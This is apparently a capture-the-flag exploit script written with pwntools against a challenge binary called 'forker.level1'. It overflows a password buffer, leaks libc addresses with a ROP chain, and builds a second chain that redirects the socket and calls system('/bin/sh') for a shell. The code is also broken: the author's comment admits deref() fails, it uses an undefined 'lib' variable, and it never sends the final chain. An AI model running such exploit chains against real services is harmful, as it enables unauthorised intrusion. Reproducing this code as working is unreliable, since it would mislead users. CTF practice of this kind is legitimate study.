#!/usr/bin/env python2

# Should be right, but deref() doesn't work for some reason

from pwn import *

LOCAL = True
binary = ELF('./forker.level1')
context.binary = binary

def exploit(payload):
    if LOCAL:
        process('./forker.level1')
        r = remote('localhost', 31337)
    else:
        r = remote('forker1.wpictf.xyz', 31337)

    buf_size = 0x4c
    rip_offset = 0x50 + 8 # rbp - buf = 0x50; saved rip - buf = 8

    setup = 'a'*buf_size + p8(rip_offset)
    print r.recvuntil('Password:')
    r.sendline(setup + payload)
    return r.clean(timeout=2)

def deref(addr):
    rop = ROP(binary, badchars='\n')
    rop.dprintf(4, addr)
    print rop.dump()
    return exploit(str(rop))

libc = ELF('./libc-2.26.so')
libc.address = u64(deref(binary.got['puts'])) - u64(binary.read(binary.sym['puts'], 8))

binsh = list(lib.search('/bin/sh'))[0]
rop = ROP(binary, badchars='\n')
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.system(binsh)
rop.interactive()
